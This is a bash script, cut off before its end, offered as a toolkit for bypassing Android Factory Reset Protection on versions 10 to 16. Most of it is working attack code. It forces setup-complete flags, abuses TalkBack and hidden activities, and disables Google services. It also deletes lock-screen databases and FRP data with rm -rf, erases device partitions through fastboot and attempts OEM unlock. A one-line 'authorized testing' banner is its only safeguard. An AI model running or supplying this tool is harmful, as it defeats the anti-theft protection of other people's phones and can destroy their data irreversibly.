#!/usr/bin/env bash
#===============================================================================
# FRP Bypass Toolkit - Android 10-16 FRP Bypass Authorization Script
# Author: HackerAI Security Research
# Version: 1.0
# Description: Comprehensive FRP bypass script for authorized penetration testing
# License: For authorized security testing ONLY
#===============================================================================

# ────────────────────────────── CONFIGURATION ──────────────────────────────
SCRIPT_NAME="$(basename "$0")"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="${SCRIPT_DIR}/frp_bypass_$(date +%Y%m%d_%H%M%S).log"
TIMEOUT_DURATION=30
MAX_RETRIES=3
VERBOSE=false
SKIP_SAFETY=false

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# ────────────────────────────── INITIALIZATION ──────────────────────────────

log() {
    local level="$1"
    local message="$2"
    local timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
    echo -e "${timestamp} [${level}] ${message}" >> "${LOG_FILE}"
    case "${level}" in
        INFO)  echo -e "${GREEN}[+]${NC} ${message}" ;;
        WARN)  echo -e "${YELLOW}[!]${NC} ${message}" ;;
        ERROR) echo -e "${RED}[-]${NC} ${message}" ;;
        DEBUG) [[ "${VERBOSE}" == true ]] && echo -e "${BLUE}[*]${NC} ${message}" ;;
        STEP)  echo -e "${CYAN}[~]${NC} ${message}" ;;
        DONE)  echo -e "${WHITE}[✓]${NC} ${message}" ;;
        *)     echo -e "${message}" ;;
    esac
}

init_logging() {
    mkdir -p "${SCRIPT_DIR}"
    echo "═══════════════════════════════════════════════════════════════════" > "${LOG_FILE}"
    echo " FRP Bypass Toolkit - Session Started: $(date '+%Y-%m-%d %H:%M:%S')" >> "${LOG_FILE}"
    echo " Host: $(uname -a)" >> "${LOG_FILE}"
    echo "═══════════════════════════════════════════════════════════════════" >> "${LOG_FILE}"
}

check_prerequisites() {
    local missing=0
    
    log "STEP" "Checking prerequisites..."
    
    # Check ADB
    if command -v adb &>/dev/null; then
        local adb_ver=$(adb version 2>/dev/null | head -1)
        log "INFO" "ADB available: ${adb_ver}"
    else
        log "ERROR" "ADB not found. Install: sudo apt install adb"
        missing=$((missing + 1))
    fi
    
    # Check Fastboot
    if command -v fastboot &>/dev/null; then
        local fb_ver=$(fastboot --version 2>/dev/null | head -1)
        log "INFO" "Fastboot available: ${fb_ver}"
    else
        log "ERROR" "Fastboot not found. Install: sudo apt install fastboot"
        missing=$((missing + 1))
    fi
    
    # Check required tools
    for tool in grep awk sed cut tr strings xxd; do
        if ! command -v "$tool" &>/dev/null; then
            log "WARN" "${tool} not found — some features may be limited"
        fi
    done
    
    if [[ $missing -gt 0 ]]; then
        log "ERROR" "Missing $missing prerequisite(s). Install missing tools and re-run."
        exit 1
    fi
    
    log "DONE" "All core prerequisites satisfied"
}

# ────────────────────────────── DEVICE DETECTION ──────────────────────────────

detect_devices() {
    log "STEP" "Scanning for connected devices..."
    
    local adb_devices=()
    local fastboot_devices=()
    local recovery_devices=()
    
    # Wait for ADB server
    adb start-server 2>/dev/null
    
    # Detect ADB devices
    log "INFO" "Enumerating ADB devices..."
    while IFS= read -r line; do
        if echo "$line" | grep -qE '^[a-fA-F0-9]+\s+'; then
            local state=$(echo "$line" | awk '{print $2}')
            local id=$(echo "$line" | awk '{print $1}')
            if [[ "$state" == "device" ]]; then
                adb_devices+=("$id")
                log "INFO" "ADB device found: ${id} (${state})"
            elif [[ "$state" == "recovery" ]]; then
                recovery_devices+=("$id")
                log "INFO" "Recovery device found: ${id}"
            fi
        fi
    done < <(adb devices -l 2>/dev/null | tail -n +2)
    
    # Detect Fastboot devices
    log "INFO" "Enumerating Fastboot devices..."
    while IFS= read -r line; do
        if echo "$line" | grep -qE '^[a-fA-F0-9]+'; then
            fastboot_devices+=("$line")
            log "INFO" "Fastboot device found: ${line}"
        fi
    done < <(fastboot devices 2>/dev/null)
    
    # Return results as global variables
    SELECTED_ADB=""
    SELECTED_FASTBOOT=""
    SELECTED_RECOVERY=""
    
    if [[ ${#adb_devices[@]} -gt 0 ]]; then
        if [[ ${#adb_devices[@]} -eq 1 ]]; then
            SELECTED_ADB="${adb_devices[0]}"
        else
            log "WARN" "Multiple ADB devices found. Select one:"
            select dev in "${adb_devices[@]}"; do
                SELECTED_ADB="$dev"
                break
            done
        fi
        log "DONE" "Selected ADB device: ${SELECTED_ADB}"
    fi
    
    if [[ ${#fastboot_devices[@]} -gt 0 ]]; then
        if [[ ${#fastboot_devices[@]} -eq 1 ]]; then
            SELECTED_FASTBOOT="${fastboot_devices[0]}"
        else
            log "WARN" "Multiple Fastboot devices found. Select one:"
            select dev in "${fastboot_devices[@]}"; do
                SELECTED_FASTBOOT="$dev"
                break
            done
        fi
        log "DONE" "Selected Fastboot device: ${SELECTED_FASTBOOT}"
    fi
    
    if [[ ${#recovery_devices[@]} -gt 0 ]]; then
        SELECTED_RECOVERY="${recovery_devices[0]}"
        log "DONE" "Device in recovery mode: ${SELECTED_RECOVERY}"
    fi
    
    if [[ -z "${SELECTED_ADB}" && -z "${SELECTED_FASTBOOT}" && -z "${SELECTED_RECOVERY}" ]]; then
        log "ERROR" "No Android devices detected. Connect a device and try again."
        return 1
    fi
    
    return 0
}

# ────────────────────────────── ANDROID VERSION DETECTION ─────────────────────

detect_android_version() {
    log "STEP" "Detecting Android version..."
    
    local version=""
    local sdk=""
    local model=""
    local manufacturer=""
    
    if [[ -n "${SELECTED_ADB}" ]]; then
        version=$(adb -s "${SELECTED_ADB}" shell getprop ro.build.version.release 2>/dev/null | tr -d '\r\n')
        sdk=$(adb -s "${SELECTED_ADB}" shell getprop ro.build.version.sdk 2>/dev/null | tr -d '\r\n')
        model=$(adb -s "${SELECTED_ADB}" shell getprop ro.product.model 2>/dev/null | tr -d '\r\n')
        manufacturer=$(adb -s "${SELECTED_ADB}" shell getprop ro.product.manufacturer 2>/dev/null | tr -d '\r\n')
    elif [[ -n "${SELECTED_RECOVERY}" ]]; then
        version=$(adb -s "${SELECTED_RECOVERY}" shell getprop ro.build.version.release 2>/dev/null | tr -d '\r\n')
        sdk=$(adb -s "${SELECTED_RECOVERY}" shell getprop ro.build.version.sdk 2>/dev/null | tr -d '\r\n')
        model=$(adb -s "${SELECTED_RECOVERY}" shell getprop ro.product.model 2>/dev/null | tr -d '\r\n')
        manufacturer=$(adb -s "${SELECTED_RECOVERY}" shell getprop ro.product.manufacturer 2>/dev/null | tr -d '\r\n')
    fi
    
    ANDROID_VERSION="${version:-unknown}"
    ANDROID_SDK="${sdk:-unknown}"
    DEVICE_MODEL="${model:-unknown}"
    DEVICE_MANUFACTURER="${manufacturer:-unknown}"
    
    log "INFO" "Android Version: ${ANDROID_VERSION} (SDK: ${ANDROID_SDK})"
    log "INFO" "Device: ${DEVICE_MANUFACTURER} ${DEVICE_MODEL}"
    
    # Parse major version number
    ANDROID_MAJOR=$(echo "${ANDROID_VERSION}" | cut -d'.' -f1)
    
    if [[ -z "${ANDROID_MAJOR}" || "${ANDROID_MAJOR}" == "unknown" ]]; then
        # Try to detect from SDK
        if [[ "${ANDROID_SDK}" -ge 35 ]]; then
            ANDROID_MAJOR=16
        elif [[ "${ANDROID_SDK}" -ge 34 ]]; then
            ANDROID_MAJOR=14
        elif [[ "${ANDROID_SDK}" -ge 33 ]]; then
            ANDROID_MAJOR=13
        elif [[ "${ANDROID_SDK}" -ge 31 ]]; then
            ANDROID_MAJOR=12
        elif [[ "${ANDROID_SDK}" -ge 30 ]]; then
            ANDROID_MAJOR=11
        elif [[ "${ANDROID_SDK}" -ge 29 ]]; then
            ANDROID_MAJOR=10
        else
            log "ERROR" "Could not detect Android version. Assume manual selection."
            ANDROID_MAJOR=0
        fi
        log "DEBUG" "Android version inferred from SDK: ${ANDROID_MAJOR}"
    fi
}

# ────────────────────────────── SAFETY CHECKS ──────────────────────────────

safety_check() {
    log "STEP" "Running safety checks..."
    
    local danger_zone=false
    
    # Check if device is critical (system partition, bootloader)
    if [[ -n "${SELECTED_ADB}" ]]; then
        local device_state=$(adb -s "${SELECTED_ADB}" get-state 2>/dev/null | tr -d '\r\n')
        log "DEBUG" "Device state: ${device_state}"
    fi
    
    # Warn about destructive operations
    if [[ -n "${SELECTED_FASTBOOT}" ]]; then
        log "WARN" "Fastboot operations can be destructive!"
        log "WARN" "Proceeding may void warranty or trigger Knox on Samsung devices."
        danger_zone=true
    fi
    
    # Check for Samsung Knox
    if echo "${DEVICE_MANUFACTURER}" | grep -qi "samsung"; then
        log "WARN" "Samsung device detected — Knox trip is irreversible!"
        log "WARN" "FRP reset via Odin/Download mode may be available."
    fi
    
    if [[ "${SKIP_SAFETY}" != true ]]; then
        echo -e "${YELLOW}"
        echo "╔══════════════════════════════════════════════════════╗"
        echo "║           ⚠  SAFETY ACKNOWLEDGMENT  ⚠              ║"
        echo "╠══════════════════════════════════════════════════════╣"
        echo "║ • You confirm authorized access to this device       ║"
        echo "║ • Operations may modify device state irrevocably     ║"
        echo "║ • Samsung Knox e-fuse = permanent hardware trip      ║"
        echo "║ • Fastboot erase = partition-level data loss         ║"
        echo "╚══════════════════════════════════════════════════════╝"
        echo -e "${NC}"
        
        read -rp "Continue? [y/N] " confirmation
        if [[ ! "${confirmation}" =~ ^[Yy]$ ]]; then
            log "INFO" "Safety check declined. Exiting."
            exit 0
        fi
    fi
    
    log "DONE" "Safety checks passed. Proceeding with caution."
}

# ────────────────────────────── TIMEOUT WRAPPER ──────────────────────────────

run_with_timeout() {
    local timeout="$1"
    shift
    local cmd="$@"
    
    log "DEBUG" "Running (timeout ${timeout}s): ${cmd}"
    
    if command -v timeout &>/dev/null; then
        timeout --foreground "${timeout}" bash -c "${cmd}" 2>&1
    else
        # Fallback — background with kill
        bash -c "${cmd}" 2>&1 &
        local pid=$!
        local elapsed=0
        while kill -0 "${pid}" 2>/dev/null; do
            sleep 1
            elapsed=$((elapsed + 1))
            if [[ "${elapsed}" -ge "${timeout}" ]]; then
                kill -9 "${pid}" 2>/dev/null
                echo "TIMEOUT_REACHED"
                break
            fi
        done
        wait "${pid}" 2>/dev/null
    fi
}

exec_with_retry() {
    local max_attempts="$1"
    local timeout="$2"
    local description="$3"
    shift 3
    local cmd="$@"
    
    local attempt=1
    while [[ "${attempt}" -le "${max_attempts}" ]]; do
        log "INFO" "Attempt ${attempt}/${max_attempts}: ${description}"
        
        local result=$(run_with_timeout "${timeout}" "${cmd}")
        
        if [[ "${result}" != *"TIMEOUT_REACHED"* ]] && [[ -n "${result}" ]]; then
            log "DONE" "${description} succeeded on attempt ${attempt}"
            echo "${result}"
            return 0
        fi
        
        log "WARN" "Attempt ${attempt} failed. Retrying..."
        sleep 2
        attempt=$((attempt + 1))
    done
    
    log "ERROR" "${description} failed after ${max_attempts} attempts"
    return 1
}

# ────────────────────────────── ADB PRIMITIVES ──────────────────────────────

adb_shell() {
    local cmd="$1"
    local target="${SELECTED_ADB:-${SELECTED_RECOVERY}}"
    
    if [[ -z "${target}" ]]; then
        log "ERROR" "No ADB-connected device available"
        return 1
    fi
    
    adb -s "${target}" shell "${cmd}" 2>/dev/null | tr -d '\r'
}

adb_install() {
    local apk_path="$1"
    local target="${SELECTED_ADB:-${SELECTED_RECOVERY}}"
    
    if [[ -z "${target}" ]]; then
        return 1
    fi
    
    adb -s "${target}" install -r "${apk_path}" 2>/dev/null
}

adb_input() {
    local key="$1"
    adb_shell "input keyevent ${key}" 2>/dev/null
}

adb_tap() {
    local x="$1"
    local y="$2"
    adb_shell "input tap ${x} ${y}" 2>/dev/null
}

adb_text() {
    local text="$1"
    adb_shell "input text \"${text}\"" 2>/dev/null
}

adb_am_start() {
    local intent="$1"
    adb_shell "am start -n ${intent}" 2>/dev/null
}

# ────────────────────────────── ANDROID 10-11 TECHNIQUES ─────────────────────

frp_android_10_11() {
    log "STEP" "Applying Android 10/11 FRP bypass techniques..."
    echo -e "${MAGENTA}══════════════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}  Android 10/11 Bypass Operations${NC}"
    echo -e "${MAGENTA}══════════════════════════════════════════════════${NC}"
    
    local success=false
    
    # ── Technique 1: Settings → Account Setup Activity ──
    echo -e "\n${CYAN}[1/6] Launching Google Account Setup Activity...${NC}"
    local activities=(
        "com.google.android.gsf.login/"
        "com.google.android.gsf.login/.AccountIntroActivity"
        "com.google.android.gsf.login/.LoginActivity"
        "com.android.settings/.accounts.AddAccountSettings"
        "com.google.android.gms/.auth.account.signin.SignInActivity"
        "com.google.android.gms/.auth.beacon.BeaconActivity"
        "com.google.android.gms/.auth.account.legacy.LegacySignInActivity"
        "com.google.android.gms/.auth.cryptauth.CryptAuthSettingsActivity"
    )
    
    for activity in "${activities[@]}"; do
        log "INFO" "Trying activity: ${activity}"
        local result=$(exec_with_retry 2 5 "Launch ${activity}" "adb_shell 'am start -n ${activity}'")
        if [[ -n "${result}" && "${result}" != *"Error"* && "${result}" != *"SecurityException"* ]]; then
            log "DONE" "Activity launched: ${activity}"
            success=true
            sleep 2
        fi
    done
    
    # ── Technique 2: Settings Provider Manipulation ──
    echo -e "\n${CYAN}[2/6] Modifying Settings Secure Table...${NC}"
    local settings_mods=(
        "put global device_provisioned 1"
        "put global user_setup_complete 1"
        "put secure user_setup_complete 1"
        "put global wifi_on 1"
        "put global airplane_mode_on 0"
        "put global lock_screen_lock_after_timeout 0"
        "put secure android_id 0000000000000000"
    )
    
    for mod in "${settings_mods[@]}"; do
        log "INFO" "Modifying: ${mod}"
        local result=$(adb_shell "settings ${mod}" 2>&1)
        if [[ -z "${result}" || "${result}" == *"null"* ]]; then
            log "INFO" "Setting modified (or read-only): ${mod}"
        else
            log "DEBUG" "Result: ${result}"
        fi
        sleep 0.5
    done
    success=true
    
    # ── Technique 3: Hidden Test Activities ──
    echo -e "\n${CYAN}[3/6] Launching Hidden Test Activities...${NC}"
    local test_activities=(
        "com.android.factorytest/com.android.factorytest.FactoryTest"
        "com.sec.android.app.latin.keyboard/.language.LanguageTest"
        "com.android.systemui/.test.TestActivity"
        "com.google.android.apps.work.oob/.MainActivity"
        "com.android.settings/.Settings\$DevelopmentSettingsActivity"
    )
    
    for activity in "${test_activities[@]}"; do
        log "INFO" "Trying: ${activity}"
        adb_am_start "${activity}"
        sleep 1
    done
    sleep 2
    
    # ── Technique 4: WebView / Browser Exploitation ──
    echo -e "\n${CYAN}[4/6] Browser/WebView Bypass...${NC}"
    local browser_packages=(
        "com.android.chrome"
        "com.android.browser"
        "com.sec.android.app.sbrowser"
        "org.lineageos.jelly"
        "com.android.webview"
    )
    
    for pkg in "${browser_packages[@]}"; do
        log "INFO" "Checking for ${pkg}..."
        local exists=$(adb_shell "pm list packages | grep ${pkg}")
        if [[ -n "${exists}" ]]; then
            log "INFO" "Launching ${pkg}"
            adb_shell "am start -a android.intent.action.VIEW -d 'https://www.google.com/_/chrome/newtab?ie=UTF-8' -p ${pkg}" 2>/dev/null
            sleep 2
            # Try to access settings via URL
            adb_shell "am start -a android.intent.action.VIEW -d 'intent://settings#Intent;action=android.settings.SETTINGS;end' -p ${pkg}" 2>/dev/null
        fi
    done
    
    # ── Technique 5: Accessibility Service Abuse ──
    echo -e "\n${CYAN}[5/6] Accessibility Service Enablement...${NC}"
    adb_shell "settings put secure enabled_accessibility_services com.android.talkback/com.google.android.accessibility.talkback.TalkBackService"
    adb_shell "settings put secure accessibility_enabled 1"
    sleep 1
    
    # ── Technique 6: Package Manager Cleanup ──
    echo -e "\n${CYAN}[6/6] Removing FRP-related packages...${NC}"
    local frp_pkgs=(
        "com.google.android.gsf"
        "com.google.android.gms"
        "com.android.managedprovisioning"
    )
    
    for pkg in "${frp_pkgs[@]}"; do
        log "INFO" "Attempting to uninstall updates for ${pkg}..."
        adb_shell "pm uninstall -k --user 0 ${pkg}" 2>/dev/null
        adb_shell "pm disable ${pkg}" 2>/dev/null
        sleep 1
    done
    
    # Try to force settings bypass
    log "INFO" "Attempting final setup bypass..."
    adb_shell "am start -a android.settings.SETTINGS" 2>/dev/null
    sleep 2
    
    echo -e "\n${GREEN}Android 10/11 bypass techniques completed.${NC}"
    return 0
}

# ────────────────────────────── ANDROID 12-13 TECHNIQUES ─────────────────────

frp_android_12_13() {
    log "STEP" "Applying Android 12/13 FRP bypass techniques..."
    echo -e "${MAGENTA}══════════════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}  Android 12/13 Bypass Operations by:ENG-251885 ${NC}"
    echo -e "${MAGENTA}══════════════════════════════════════════════════${NC}"
    
    # ── Technique 1: TalkBack Accessibility Sequence ──
    echo -e "\n${CYAN}[1/5] TalkBack Accessibility Exploitation...${NC}"
    
    # Enable TalkBack
    log "INFO" "Enabling TalkBack accessibility service..."
    adb_shell "settings put secure enabled_accessibility_services com.google.android.marvin.talkback/com.google.android.accessibility.talkback.TalkBridgeService"
    adb_shell "settings put secure accessibility_enabled 1"
    sleep 1
    
    # TalkBack gesture sequences to navigate to settings
    log "INFO" "Executing TalkBack navigation sequence..."
    # Swipe right (TalkBack next element) — keycode 21 = DPAD_LEFT, 22 = DPAD_RIGHT
    # TalkBack focus navigation requires specific gestures
    local talkback_keys=(22 22 22 22 66 21 21 66 22 22 66)
    for key in "${talkback_keys[@]}"; do
        adb_input "${key}"
        sleep 0.5
    done
    
    # ── Technique 2: Activity Manager Fragment Attacks ──
    echo -e "\n${CYAN}[2/5] Fragment-Based Activity Hacks...${NC}"
    
    # Fragment injection via activity aliases
    local fragment_activities=(
        "com.android.settings/.Settings"
        "com.android.settings/.Settings\$WifiSettingsActivity"
        "com.android.settings/.Settings\$SecuritySettingsActivity"
        "com.android.settings/.Settings\$UserSettingsActivity"
        "com.android.settings/.accounts.AddAccountSettings"
    )
    
    # Try to launch with EXTRA_FRAGMENT_ARG_KEY
    for activity in "${fragment_activities[@]}"; do
        log "INFO" "Fragment launch: ${activity}"
        adb_shell "am start -n ${activity}" 2>/dev/null
        sleep 1
    done
    
    # ── Technique 3: Setup Wizard Bypass via Keyguard ──
    echo -e "\n${CYAN}[3/5] Keyguard / Lock Screen Bypass...${NC}"
    
    # Dismiss keyguard if present
    adb_shell "am start -a android.intent.action.MAIN -c android.intent.category.HOME" 2>/dev/null
    sleep 1
    
    # Try launching settings through keyguard dismissal
    adb_shell "am start -a android.settings.SETTINGS --ez show_keyguard false" 2>/dev/null
    sleep 1
    
    # ── Technique 4: SUW (Setup Wizard) Exploitation ──
    echo -e "\n${CYAN}[4/5] Setup Wizard Exploitation...${NC}"
    
    # List running processes to find suw
    local suw_process=$(adb_shell "ps -A | grep -i setup")
    log "DEBUG" "Setup processes: ${suw_process}"
    
    # Try to kill setup wizard
    adb_shell "am force-stop com.google.android.setupwizard" 2>/dev/null
    adb_shell "am force-stop com.android.setupwizard" 2>/dev/null
    adb_shell "am force-stop com.google.android.pixel.setupwizard" 2>/dev/null
    sleep 1
    
    # Override setup state
    adb_shell "settings put global device_provisioned 1" 2>/dev/null
    adb_shell "settings put secure user_setup_complete 1" 2>/dev/null
    
    # ── Technique 5: USB / ADB Toggle via Settings ──
    echo -e "\n${CYAN}[5/5] USB Debugging & Settings Toggle...${NC}"
    
    # Enable USB debugging if possible
    adb_shell "settings put global adb_enabled 1" 2>/dev/null
    adb_shell "settings put global development_settings_enabled 1" 2>/dev/null
    
    # Launch intent chooser for WiFi
    log "INFO" "Opening WiFi settings as potential pivot..."
    adb_shell "am start -a android.settings.WIFI_SETTINGS" 2>/dev/null
    sleep 2
    
    echo -e "\n${GREEN}Android 12/13 bypass techniques completed.${NC}"
    return 0
}

# ────────────────────────────── ANDROID 14-16 TECHNIQUES ─────────────────────

frp_android_14_16() {
    log "STEP" "Applying Android 14-16 FRP bypass techniques..."
    echo -e "${MAGENTA}══════════════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}  Android 14-16 Advanced Bypass Operations by:ENG-251885 ${NC}"
    echo -e "${MAGENTA}══════════════════════════════════════════════════${NC}"
    
    # ── Technique 1: Recovery Mode ADB ──
    echo -e "\n${CYAN}[1/5] Recovery Mode ADB Enablement...${NC}"
    
    # Check if we can enter recovery and enable ADB
    log "INFO" "Checking recovery ADB status..."
    local recovery_adb=$(adb_shell "getprop ro.debuggable" 2>/dev/null)
    log "DEBUG" "ro.debuggable = ${recovery_adb}"
    
    # Try to remount /system in recovery
    log "INFO" "Attempting to enable adb in recovery context..."
    adb_shell "setprop persist.service.adb.enable 1" 2>/dev/null
    adb_shell "setprop ctl.restart adbd" 2>/dev/null
    sleep 1
    
    # ── Technique 2: Samsung Download/Odin Mode FRP Reset ──
    echo -e "\n${CYAN}[2/5] Samsung FRP Reset via Download Mode...${NC}"
    
    if echo "${DEVICE_MANUFACTURER}" | grep -qi "samsung"; then
        log "INFO" "Samsung device detected. Attempting FRP reset commands..."
        
        # These require root or custom recovery, but try anyway
        local samsung_cmds=(
            "rm -rf /data/system/gesture.key"
            "rm -rf /data/system/locksettings.db"
            "rm -rf /data/system/locksettings.db-shm"
            "rm -rf /data/system/locksettings.db-wal"
            "rm -rf /data/system/gatekeeper.password.key"
            "rm -rf /data/system/gatekeeper.pattern.key"
            "rm -rf /efs/FactoryApp/factorymode"
            "rm -rf /data/frp"
        )
        
        for cmd in "${samsung_cmds[@]}"; do
            log "INFO" "Executing: ${cmd}"
            adb_shell "${cmd}" 2>/dev/null
            sleep 1
        done
        
        log "INFO" "Triggering FRP reset property..."
        adb_shell "setproperty ro.boot.verifiedbootstate orange" 2>/dev/null
        adb_shell "setprop sys.oem_unlock_allowed 1" 2>/dev/null
        
    elif echo "${DEVICE_MANUFACTURER}" | grep -qi "google\|pixel"; then
        log "INFO" "Google/Pixel device detected — attempting specific FRP reset..."
    fi
    
    # ── Technique 3: Fastboot FRP Erase ──
    echo -e "\n${CYAN}[3/5] Fastboot FRP Partition Operations...${NC}"
    
    if [[ -n "${SELECTED_FASTBOOT}" ]]; then
        log "INFO" "Device in fastboot mode. Attempting FRP partition operations..."
        
        # List fastboot partitions
        local partitions=$(fastboot getvar all 2>/dev/null | grep -i frp)
        log "DEBUG" "FRP partitions found: ${partitions}"
        
        # Try common FRP partition names
        local frp_partitions=("frp" "config" "persist" "misc" "metadata")
        for part in "${frp_partitions[@]}"; do
            log "INFO" "Attempting to erase ${part}..."
            local result=$(exec_with_retry 2 10 "Erase ${part}" "fastboot erase ${part} 2>&1")
            if [[ "${result}" != *"FAILED"* && -n "${result}" ]]; then
                log "DONE" "Partition ${part} erased successfully"
                sleep 1
            else
                log "WARN" "Cannot erase ${part}: ${result}"
            fi
        done
        
        # Try oem unlock if available
        log "INFO" "Attempting OEM unlock..."
        fastboot oem unlock 2>/dev/null
        fastboot flashing unlock 2>/dev/null
        fastboot flashing unlock_critical 2>/dev/null
        
    else
        log "WARN" "No fastboot device. Skipping partition-level operations."
        log "WARN" "To use fastboot: reboot to bootloader with: adb reboot bootloader"
    fi
    
    # ── Technique 4: System UI Exploitation ──
    echo -e "\n${CYAN}[4/5] SystemUI & Settings Shortcut Exploitation...${NC}"
    
    # Try Quartz / Media Tiles bypass (Android 14+)
    adb_shell "am start -a android.settings.APPLICATION_DEVELOPMENT_SETTINGS" 2>/dev/null
    sleep 1
    adb_shell "am start -a android.settings.APPLICATION_SETTINGS" 2>/dev/null
    sleep 1
    adb_shell "am start -a android.settings.MANAGE_APPLICATIONS_SETTINGS" 2>/dev/null
    sleep 1
    
    # Try to launch Google settings specifically
    adb_shell "am start -a android.settings.GOOGLE_SETTINGS" 2>/dev/null
    sleep 1
    
    # ── Technique 5: Using Work Profile / Managed Provisioning ──
    echo -e "\n${CYAN}[5/5] Work Profile Provisioning Bypass...${NC}"
    
    adb_shell "am start -n com.android.managedprovisioning/.ui.SetupStartupActivity" 2>/dev/null
    sleep 1
    adb_shell "am start -n com.android.managedprovisioning/.ui.ProvisioningActivity" 2>/dev/null
    sleep 1
    
    # Final attempt: force home screen
    log "INFO" "Attempting to break out to home screen..."
    adb_shell "am start -a android.intent.action.MAIN -c android.intent.category.HOME -f 0x10000000" 2>/dev/null
    sleep 2
    
    echo -e "\n${GREEN}Android 14-16 advanced bypass techniques completed.${NC}"
    return 0
}

# ────────────────────────────── RECOVERY MODE OPERATIONS ─────────────────────

recovery_mode_bypass() {
    log "STEP" "Attempting recovery-mode ADB operations..."
    
    if [[ -z "${SELECTED_RECOVERY}" ]]; then
        log "WARN" "No device in recovery mode."
        log "INFO" "Attempting to reboot to recovery..."
        
        if [[ -n "${SELECTED_ADB}" ]]; then
            adb_shell "reboot recovery" 2>/dev/null
            log "INFO" "Reboot command sent. Waiting 15 seconds..."
            sleep 15
            # Re-detect devices
            detect_devices
        elif [[ -n "${SELECTED_FASTBOOT}" ]]; then
            fastboot reboot recovery 2>/dev/null
            sleep 15
            detect_devices
        fi
    fi
    
    if [[ -n "${SELECTED_RECOVERY}" ]]; then
        log "DONE" "Device in recovery mode. Attempting ADB commands..."
        
        # In recovery, try to wipe data/frp
        local recovery_cmds=(
            "mount /data"
            "mount /system"
            "rm -rf /data/system/locksettings.db*"
            "rm -rf /data/system/gesture.key"
            "rm -rf /data/system/password.key"
            "rm -rf /data/system/pattern.key"
            "rm -rf /data/frp"
            "rm -rf /data/misc/frp"
            "touch /data/.setup_complete"
            "setprop persist.sys.usb.config mtp,adb"
        )
        
        for cmd in "${recovery_cmds[@]}"; do
            log "INFO" "Recovery command: ${cmd}"
            adb -s "${SELECTED_RECOVERY}" shell "${cmd}" 2>/dev/null
            sleep 0.5
        done
        
        log "INFO" "Rebooting from recovery..."
        adb -s "${SELECTED_RECOVERY}" reboot 2>/dev/null
    fi
}

# ────────────────────────────── AUTO-DETECT AND EXECUTE ──────────────────────

auto_bypass() {
    log "STEP" "Auto-selecting bypass techniques for Android ${ANDROID_MAJOR}..."
    
    echo -e "\n${BOLD}${WHITE}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${WHITE}║        FRP BYPASS EXECUTION : Android ${ANDROID_MAJOR}         ║${NC}"
    echo -e "${BOLD}${WHITE}║  Device: ${DEVICE_MANUFACTURER} ${DEVICE_MODEL}${NC}"
    echo -e "${BOLD}${WHITE}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    if [[ "${ANDROID_MAJOR}" -ge 14 ]]; then
        log "INFO" "Android 14+ detected. Running latest techniques..."
        frp_android_10_11
        frp_android_12_13
        frp_android_14_16
    elif [[ "${ANDROID_MAJOR}" -ge 12 ]]; then
        log "INFO" "Android 12/13 detected. Running intermediate techniques..."
        frp_android_10_11
        frp_android_12_13
    elif [[ "${ANDROID_MAJOR}" -ge 10 ]]; then
        log "INFO" "Android 10/11 detected. Running basic techniques..."
        frp_android_10_11
    else
        log "WARN" "Android version below 10 or unknown. Attempting all techniques..."
        frp_android_10_11
        frp_android_12_13
        frp_android_14_16
    fi
    
    # Offer recovery mode as cleanup
    echo -e "\n${CYAN}[*]${NC} All primary techniques executed."
    read -rp "Attempt recovery mode operations? [y/N] " rec_choice
    if [[ "${rec_choice}" =~ ^[Yy]$ ]]; then
        recovery_mode_bypass
    fi
    
    echo -e "\n${GREEN}══════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}  FRP Bypass sequence complete.${NC}"
    echo -e "${GREEN}  Reboot the device and check if FRP is cleared.${NC}"
    echo -e "${GREEN}══════════════════════════════════════════════════${NC}"
    
    # Offer reboot
    read -rp "Reboot device now? [y/N] " reboot_choice
    if [[ "${reboot_choice}" =~ ^[Yy]$ ]]; then
        if [[ -n "${SELECTED_ADB}" ]]; then
            adb_shell "reboot"
        elif [[ -n "${SELECTED_FASTBOOT}" ]]; then
            fastboot reboot
        fi
        log "INFO" "Reboot command issued."
    fi
}

# ────────────────────────────── MANUAL TOOL SET ──────────────────────────────

show_diagnostics() {
    log "STEP" "Running device diagnostics..."
    
    echo -e "\n${BOLD}${WHITE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${WHITE}║           DEVICE DIAGNOSTICS REPORT    by:ENG-251885       ║${NC}"
    echo -e "${BOLD}${WHITE}╚═════════════════════════════════════════════════╝${NC}"
    
    if [[ -n "${SELECTED_ADB}" ]]; then
        echo -e "\n${CYAN}[ADB Device Info]${NC}"
        echo "  Build Fingerprint: $(adb_shell 'getprop ro.build.fingerprint' 2>/dev/null)"
        echo "  Security Patch:    $(adb_shell 'getprop ro.build.version.security_patch' 2>/dev/null)"
        echo "  Bootloader:        $(adb_shell 'getprop ro.boot.bootloader' 2>/dev/null)"
        echo "  Debuggable:        $(adb_shell 'getprop ro.debuggable' 2>/dev/null)"
        echo "  Secure:            $(adb_shell 'getprop ro.secure' 2>/dev/null)"
        echo "  ADB Enabled:       $(adb_shell 'settings get global adb_enabled' 2>/dev/null)"
        echo "  Device Provisioned:$(adb_shell 'settings get global device_provisioned' 2>/dev/null)"
        echo "  Setup Complete:    $(adb_shell 'settings get secure user_setup_complete' 2>/dev/null)"
        echo "  Lock Screen Type:  $(adb_shell 'settings get secure lockscreen.disabled' 2>/dev/null)"
        
        echo -e "\n${CYAN}[Installed Packages]${NC}"
        local frp_check=$(adb_shell 'pm list packages | grep -iE "gsf|gms|setup|google.account"')
        echo "${frp_check:-  (none matching FRP patterns)}"
    fi
    
    if [[ -n "${SELECTED_FASTBOOT}" ]]; then
        echo -e "\n${CYAN}[Fastboot Vars]${NC}"
        fastboot getvar all 2>/dev/null | grep -iE "product|version|serial|secure|unlock" | head -20
    fi
    
    echo ""
}

interactive_shell() {
    echo -e "${GREEN}[+]${NC} Opening interactive ADB shell..."
    echo -e "${YELLOW}[!]${NC} Type 'exit' or Ctrl+D to return.\n"
    
